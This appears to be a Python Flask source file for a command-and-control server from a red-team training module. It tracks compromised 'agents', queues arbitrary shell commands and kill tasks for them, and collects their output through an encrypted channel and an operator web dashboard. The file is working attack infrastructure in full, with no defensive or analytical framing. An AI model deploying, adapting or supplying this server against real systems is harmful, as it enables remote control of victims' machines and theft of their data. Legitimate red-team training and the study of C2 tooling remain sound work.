#!/usr/bin/env python3
"""
C2 Server - HTTPS command & control
Skill 14: Red Team Ops
"""
import json
import uuid
import time
import ssl
import threading
from datetime import datetime
from flask import Flask, request, jsonify, Response
from cryptography.fernet import Fernet

app = Flask(__name__)

AGENTS = {}
TASKS = {}
RESULTS = {}
TASK_COUNTER = 0
LOCK = threading.Lock()
FERNET_KEY = Fernet.generate_key()
FERNET = Fernet(FERNET_KEY)

def encrypt(data):
    return FERNET.encrypt(data.encode())

def decrypt(data):
    return FERNET.decrypt(data.encode()).decode()

def gen_id():
    return str(uuid.uuid4())[:8]

@app.route('/api/key', methods=['GET'])
def get_key():
    return jsonify({"key": FERNET_KEY.decode()})

@app.route('/api/login', methods=['POST'])
def agent_login():
    data = request.get_json(force=True)
    raw = decrypt(data.get("cipher", ""))
    info = json.loads(raw)
    aid = gen_id()
    with LOCK:
        AGENTS[aid] = {
            "id": aid,
            "hostname": info.get("hostname", "?"),
            "user": info.get("user", "?"),
            "os": info.get("os", "?"),
            "ip": request.remote_addr,
            "first_seen": datetime.utcnow().isoformat(),
            "last_seen": datetime.utcnow().isoformat(),
            "alive": True
        }
        TASKS[aid] = []
        RESULTS[aid] = []
    return jsonify({"agent_id": aid, "interval": 5})

@app.route('/api/agents', methods=['GET'])
def list_agents():
    with LOCK:
        return jsonify({"agents": list(AGENTS.values())})

@app.route('/api/tasks/<aid>', methods=['GET', 'POST'])
def handle_tasks(aid):
    if request.method == 'GET':
        with LOCK:
            if aid in AGENTS:
                AGENTS[aid]["last_seen"] = datetime.utcnow().isoformat()
            tasks = TASKS.get(aid, [])
            out = tasks[:]
            TASKS[aid] = []
        return jsonify({"tasks": out, "interval": 5})
    else:
        data = request.get_json(force=True)
        raw = decrypt(data.get("cipher", ""))
        result = json.loads(raw)
        with LOCK:
            rlist = RESULTS.get(aid, [])
            rlist.append(result)
            RESULTS[aid] = rlist
        return jsonify({"ok": True})

@app.route('/api/task', methods=['POST'])
def issue_task():
    data = request.get_json(force=True)
    aid = data.get("agent_id", "")
    task_type = data.get("type", "shell")
    payload = data.get("payload", "")
    with LOCK:
        tid = len(TASKS.get(aid, [])) + 1
        task = {"id": tid, "type": task_type, "payload": payload, "issued": datetime.utcnow().isoformat()}
        if aid in TASKS:
            TASKS[aid].append(task)
        else:
            return jsonify({"error": "unknown agent"}), 404
    return jsonify({"task_id": tid})

@app.route('/api/results/<aid>', methods=['GET'])
def get_results(aid):
    with LOCK:
        r = RESULTS.get(aid, [])
    return jsonify({"results": r})

DASHBOARD = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>C2 Dashboard</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}
h1{color:#58a6ff;margin-bottom:20px}
h2{color:#8b949e;margin:20px 0 10px}
table{width:100%;border-collapse:collapse;margin-bottom:20px}
th,td{text-align:left;padding:8px 12px;border-bottom:1px solid #30363d}
th{background:#161b22;color:#8b949e;font-size:13px;text-transform:uppercase}
td{font-family:monospace;font-size:14px}
tr:hover{background:#161b22}
.id{color:#58a6ff}
.host{color:#7ee787}
.user{color:#d2a8ff}
.os{color:#79c0ff}
.ip{color:#ffa657}
.time{color:#8b949e;font-size:12px}
.selected{background:#1f2937!important;border-left:3px solid #58a6ff}
pre{background:#161b22;padding:12px;border-radius:6px;overflow:auto;max-height:300px;font-size:13px;margin-top:8px}
input,select,button{padding:8px 12px;border:1px solid #30363d;border-radius:6px;background:#0d1117;color:#c9d1d9;font-size:14px}
input{width:400px;font-family:monospace}
button{background:#238636;border-color:#238636;cursor:pointer;font-weight:600}
button:hover{background:#2ea043}
button.danger{background:#da3633;border-color:#da3633}
button.danger:hover{background:#f85149}
select{width:200px}
.row{display:flex;gap:12px;align-items:center;margin:10px 0}
.label{color:#8b949e;font-size:13px;width:80px}
.hidden{display:none}
#results{white-space:pre-wrap}
.badge{padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600}
.badge-online{background:#238636;color:#fff}
.badge-offline{background:#da3633;color:#fff}
.empty{color:#484f58;font-style:italic;padding:20px;text-align:center}
</style>
</head>
<body>
<h1>&#9889; C2 Dashboard</h1>
<div id="key-box" class="row"><span class="label">Key</span><code id="key-display"></code></div>
<h2>Agents</h2>
<table><thead><tr><th>ID</th><th>Hostname</th><th>User</th><th>OS</th><th>IP</th><th>Last Seen</th></tr></thead><tbody id="agents-body"></tbody></table>
<div id="cmd-panel" class="hidden">
<h2>Command</h2>
<div class="row"><span class="label">Agent</span><code id="selected-agent"></code></div>
<div class="row"><span class="label">Command</span><input id="cmd-input" placeholder="whoami" onkeydown="if(event.key==='Enter')sendCmd()"></div>
<div class="row"><button onclick="sendCmd()">Execute</button><button class="danger" onclick="killAgent()">Kill Agent</button></div>
<h2>Results</h2>
<div id="results"></div>
</div>
<script>
let agents={}, selectedId=null, poll=null;
async function api(url,opts={}){let r=await fetch(url,opts);return r.json()}
async function loadAgents(){
  let d=await api('/api/agents');
  agents={}; let tb=document.getElementById('agents-body'); tb.innerHTML='';
  for(let a of d.agents||[]){
    agents[a.id]=a; let tr=document.createElement('tr');
    if(a.id===selectedId)tr.className='selected';
    tr.innerHTML=`<td class="id">${a.id}</td><td class="host">${a.hostname}</td><td class="user">${a.user}</td><td class="os">${a.os}</td><td class="ip">${a.ip}</td><td class="time">${(a.last_seen||'').slice(0,19)}</td>`;
    tr.onclick=()=>selectAgent(a.id); tb.appendChild(tr);
  }
}
async function selectAgent(id){
  selectedId=id; document.getElementById('selected-agent').textContent=id;
  document.getElementById('cmd-panel').classList.remove('hidden');
  document.getElementById('cmd-input').value=''; document.getElementById('results').textContent='';
  loadAgents(); loadResults();
  if(poll)clearInterval(poll); poll=setInterval(loadResults,3000);
}
async function loadResults(){
  if(!selectedId)return; let d=await api(`/api/results/${selectedId}`);
  let el=document.getElementById('results');
  let r=d.results||[]; if(!r.length){el.innerHTML='<div class="empty">No results yet</div>';return}
  el.innerHTML='';
  for(let res of r.slice().reverse()){
    let out=res.output||{},b=document.createElement('div');
    b.style.cssText='background:#161b22;padding:12px;border-radius:6px;margin-bottom:8px;border-left:3px solid #238636';
    let txt=''; if(out.stdout)txt+=out.stdout; if(out.stderr)txt+='\n[stderr] '+out.stderr;
    b.innerHTML=`<div style="color:#8b949e;font-size:11px;margin-bottom:4px">Task #${res.task_id} | exit: ${out.code??'?'}</div><pre>${escHtml(txt||'(empty)')}</pre>`;
    el.appendChild(b);
  }
}
async function sendCmd(){
  let cmd=document.getElementById('cmd-input').value; if(!cmd||!selectedId)return;
  await api('/api/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:selectedId,type:'shell',payload:cmd})});
  document.getElementById('cmd-input').value='';
  setTimeout(loadResults,1000);
}
async function killAgent(){
  if(!selectedId||!confirm('Kill agent '+selectedId+'?'))return;
  await api('/api/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:selectedId,type:'exit',payload:''})});
}
function escHtml(s){let d=document.createElement('div');d.textContent=s;return d.innerHTML}
(async()=>{let k=await api('/api/key');document.getElementById('key-display').textContent=k.key;loadAgents();setInterval(loadAgents,5000)})();
</script>
</body>
</html>"""

@app.route('/')
def dashboard():
    return Response(DASHBOARD, mimetype='text/html')

if __name__ == '__main__':
    import sys
    use_tls = "--no-tls" not in sys.argv
    proto = "https" if use_tls else "http"
    print(f"[C2] Server key: {FERNET_KEY.decode()}")
    print(f"[C2] Listening on {proto}://0.0.0.0:8443")
    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain('cert.pem', 'key.pem')
        app.run(host='0.0.0.0', port=8443, ssl_context=ctx, debug=False)
    else:
        app.run(host='0.0.0.0', port=8443, debug=False)
